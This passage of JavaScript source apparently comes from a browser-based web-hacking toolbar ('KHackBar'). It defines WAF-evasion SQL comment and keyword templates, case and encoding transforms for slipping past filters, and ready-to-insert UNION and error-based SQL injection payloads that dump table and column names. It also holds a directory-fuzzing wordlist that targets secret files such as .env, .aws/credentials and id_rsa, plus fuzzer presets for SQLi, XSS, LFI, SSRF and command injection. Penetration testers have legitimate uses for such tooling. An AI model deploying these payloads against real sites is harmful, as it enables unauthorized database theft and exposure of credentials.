    { label: '/*!{{SEL}}*/', value: '/*!{{SEL}}*/' },
    { label: '/*!50000{{SEL}}*/', value: '/*!50000{{SEL}}*/' },
    { label: '/*!40000{{SEL}}*/', value: '/*!40000{{SEL}}*/' },
    { label: '/*!12345{{SEL}}*/', value: '/*!12345{{SEL}}*/' },
    { label: '/**/{{SEL}}/**/', value: '/**/{{SEL}}/**/' }
  ],
  'Keyword Bypass': [
    { label: '/**/ORDER/**/BY/**/', value: '/**/ORDER/**/BY/**/' },
    { label: '/*!ORDER*/+/*!BY*/', value: '/*!ORDER*/+/*!BY*/' },
    { label: '/*!50000ORDER BY*/', value: '/*!50000ORDER BY*/' },
    { label: '/**/UNION/**/SELECT/**/', value: '/**/UNION/**/SELECT/**/' },
    { label: '/*!UNION*//*!SELECT*/', value: '/*!UNION*//*!SELECT*/' },
    { label: '/*!50000UNION*//*!50000SELECT*/', value: '/*!50000UNION*//*!50000SELECT*/' },
    { label: '/**/AND/**/', value: '/**/AND/**/' },
    { label: '/**/OR/**/', value: '/**/OR/**/' },
    { label: '/*!AND*/', value: '/*!AND*/' },
    { label: '/*!OR*/', value: '/*!OR*/' }
  ],
  'Concat Bypass': [
    { label: 'CONCAT({{SEL}})', value: 'CONCAT({{SEL}})' },
    { label: 'CONCAT_WS(0x3a,{{SEL}})', value: 'CONCAT_WS(0x3a,{{SEL}})' },
    { label: 'GROUP_CONCAT({{SEL}})', value: 'GROUP_CONCAT({{SEL}})' }
  ]
};

// ---- WAF Bypass Transforms (selection-based, applied via a function) ----
// These operate on the selected text itself rather than wrapping it.
const wafTransforms = {
  'Whitespace / Encoding': [
    { label: 'spaces → /**/', fn: function (s) { return s.split(' ').join('/**/'); } },
    { label: 'spaces → %0a', fn: function (s) { return s.split(' ').join('%0a'); } },
    { label: 'spaces → %0d%0a', fn: function (s) { return s.split(' ').join('%0d%0a'); } },
    { label: 'spaces → %09 (tab)', fn: function (s) { return s.split(' ').join('%09'); } },
    { label: 'spaces → +', fn: function (s) { return s.split(' ').join('+'); } }
  ],
  'Case / Numeric': [
    { label: 'rAnDoMiZe CaSe', fn: function (s) {
        return s.split('').map(function (c) {
          if (/[a-z]/.test(c)) return Math.random() < 0.5 ? c.toUpperCase() : c;
          if (/[A-Z]/.test(c)) return Math.random() < 0.5 ? c.toLowerCase() : c;
          return c;
        }).join('');
      } },
    { label: 'number → 0xHEX', fn: function (s) {
        var n = parseInt(s.trim(), 10);
        return isNaN(n) ? s : '0x' + n.toString(16);
      } },
    { label: 'number → scientific (1e0)', fn: function (s) {
        var n = parseInt(s.trim(), 10);
        return isNaN(n) ? s : n + 'e0';
      } }
  ]
};

// ---- WAF One-Shot Extraction (ready-made payloads, WAF-SETS style) ----
// Plain insert-at-cursor payloads for common data extraction one-liners.
const wafOneShot = [
  { label: 'Get tables (GROUP_CONCAT)', value: "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a),2,3 FROM information_schema.tables WHERE table_schema=database()-- -" },
  { label: 'Get columns (GROUP_CONCAT)', value: "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR 0x3a),2,3 FROM information_schema.columns WHERE table_name=0x7573657273-- -" },
  { label: 'Get tables (one shot, error-based)', value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a) FROM information_schema.tables WHERE table_schema=database()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -" },
  { label: 'Get columns (one shot, error-based)', value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT GROUP_CONCAT(column_name SEPARATOR 0x3a) FROM information_schema.columns WHERE table_name=0x7573657273),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -" }
];

// ---- Directory / File Fuzzing Wordlist ----
// A curated list of common paths/files for directory-busting style fuzzing.
// Used as a default payload set in the Fuzzer panel — put [FUZZ] in the URL
// path (e.g. https://target.com/[FUZZ]) and load this list.
const dirWordlist = [
  "admin", "administrator", "admin.php", "admin/login", "admin/login.php",
  "login", "login.php", "signin", "signup", "register",
  "wp-admin", "wp-login.php", "wp-content", "wp-includes", "wp-config.php",
  "api", "api/v1", "api/v2", "graphql", "swagger", "swagger-ui", "swagger.json",
  "backup", "backups", "backup.zip", "backup.sql", "backup.tar.gz", "db.sql", "dump.sql", "database.sql",
  ".git", ".git/config", ".git/HEAD", ".svn", ".hg", ".idea", ".vscode", ".DS_Store",
  ".env", ".env.local", ".env.production", ".htaccess", ".htpasswd", ".npmrc", ".aws", ".aws/credentials",
  "config", "config.php", "configuration.php", "settings.php", "web.config", "docker-compose.yml", "Dockerfile",
  "package.json", "composer.json", "composer.lock", "yarn.lock", "requirements.txt",
  "test", "tests", "testing", "staging", "dev", "development", "beta",
  "uploads", "upload", "files", "images", "img", "assets", "static", "public",
  "js", "css", "includes", "inc", "lib", "libs", "vendor", "node_modules",
  ".well-known", "robots.txt", "sitemap.xml", "sitemap_index.xml", "crossdomain.xml",
  "server-status", "server-info", "phpinfo.php", "info.php", "phpmyadmin", "adminer.php", "pma",
  "actuator", "actuator/health", "actuator/env", "health", "healthz", "status", "metrics", "version", "debug",
  "console", "shell", "cgi-bin", "old", "old_site", "tmp", "temp",
  "dashboard", "panel", "cpanel", "webmail", "manager", "management", "monitor",
  "reset-password", "forgot-password", "private", "secret", "secrets", "keys", "key.pem", "id_rsa",
  "error.log", "access.log", "debug.log", "README.md", "CHANGELOG.md", "LICENSE"
];

// ---- Fuzzer Payload Presets ----
// Maps a preset id to a human label and the payload list it should load
// into the Fuzzer panel's textarea. Reuses predatorData categories where
// it makes sense (SQLi, XSS, etc.) plus the dedicated dirWordlist above.
const fuzzerPresets = [
  { id: 'dirs', label: 'Directory / File Fuzzing (common paths)', list: dirWordlist },
  { id: 'sql', label: 'SQL Injection', list: predatorData.sql },
  { id: 'wafunion', label: 'WAF UNION Bypass (SQLi)', list: predatorData.wafunion },
  { id: 'xss', label: 'XSS', list: predatorData.xss },
  { id: 'lfi', label: 'LFI / Path Traversal', list: predatorData.lfi },
  { id: 'nosql', label: 'NoSQL Injection', list: predatorData.nosql },
  { id: 'ssti', label: 'SSTI', list: predatorData.ssti },
  { id: 'osci', label: 'OS Command Injection', list: predatorData.osci },
  { id: 'ssrf', label: 'SSRF', list: predatorData.ssrf },
  { id: 'blind', label: 'Blind SQLi', list: predatorData.blind }
];

// ---- Extraction Handlers (for data extraction view) ----
const extractionHandlers = {
  default: function(text) { return text; },
  regex: function(text, pattern) {
    try {
      const regex = new RegExp(pattern, 'gi');
      const matches = text.match(regex);
      return matches ? matches.join('\n') : 'No matches found.';
    } catch (e) {
      return 'Regex error: ' + e.message;
    }
  },
  json: function(text) {
    try {
      return JSON.stringify(JSON.parse(text), null, 2);
    } catch (e) {
      return 'Invalid JSON: ' + e.message;
    }
  },
  hex: function(text) {
    return text.split('').map(function(c) {
      return '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0');
    }).join('');
  }
};

// ---- Prompt Logic (for display/UI helpers) ----
const promptLogic = {
  getCategory: function(id) {
    const map = {
      sql: 'SQL Injection', union: 'UNION Based', wafunion: 'WAF UNION',
      waf: 'WAF Bypass', mysqldios: 'MySQL DIOS', postgredios: 'PostgreSQL DIOS',
      localdios: 'Local File DIOS', mssql: 'MsSQL Injection', error: 'Error Based',
      xss: 'XSS Injection', lfi: 'Local File Inclusion', nosql: 'NoSQL Injection',
      ssrf: 'SSRF', ssrf_rce: 'SSRF + RCE', ssti: 'SSTI',
      blind: 'Blind SQLi', replace: 'Replace', osci: 'OS Command Injection'
    };
    return map[id] || id;
  },

  getPayloadCount: function(category) {
    return predatorData[category] ? predatorData[category].length : 0;
  }
};

// ---- Expose to namespace ----
window.KHackBar.Payloads.predatorData = predatorData;
window.KHackBar.Payloads.extractionHandlers = extractionHandlers;
window.KHackBar.Payloads.promptLogic = promptLogic;
window.KHackBar.Payloads.wafTemplates = wafTemplates;
window.KHackBar.Payloads.wafTransforms = wafTransforms;
window.KHackBar.Payloads.wafOneShot = wafOneShot;
window.KHackBar.Payloads.dirWordlist = dirWordlist;
window.KHackBar.Payloads.fuzzerPresets = fuzzerPresets;
